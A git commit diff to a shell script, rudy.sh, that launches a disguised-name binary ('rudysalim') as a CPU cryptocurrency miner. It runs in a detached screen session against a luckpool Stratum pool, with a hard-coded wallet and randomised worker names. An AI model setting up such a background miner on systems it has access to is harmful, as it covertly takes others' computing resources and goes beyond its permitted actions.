bf86daab65b17493a06a656949e59a8e2094f95f
bagsdmreal <bagsdmreal@gmail.com>
2024-07-23 15:57:29 +0700

    Update rudy.sh

--- rudy.sh
+++ rudy.sh
@@ -1,3 +1,9 @@
 #!/bin/bash
+sudo apt-get install screen -y
 
-chmod +x rudysalim && ./rudysalim -c stratum+tcp://na.luckpool.net:3956#xnsub -u RVAf4cAJKVaGY3mwjfs8sb1dYnCJ6eZS8o.RIG01 -p x --cpu 17
+POOL=stratum+tcp://na.luckpool.net:3956#xnsub
+WALLET=RVAf4cAJKVaGY3mwjfs8sb1dYnCJ6eZS8o
+WORKER=$(echo $(shuf -i 1-99 -n 1)-RIG)
+
+chmod +x rudysalim
+screen -dmS cpu ./rudysalim -c $POOL -u $WALLET.$WORKER -p x --cpu 17
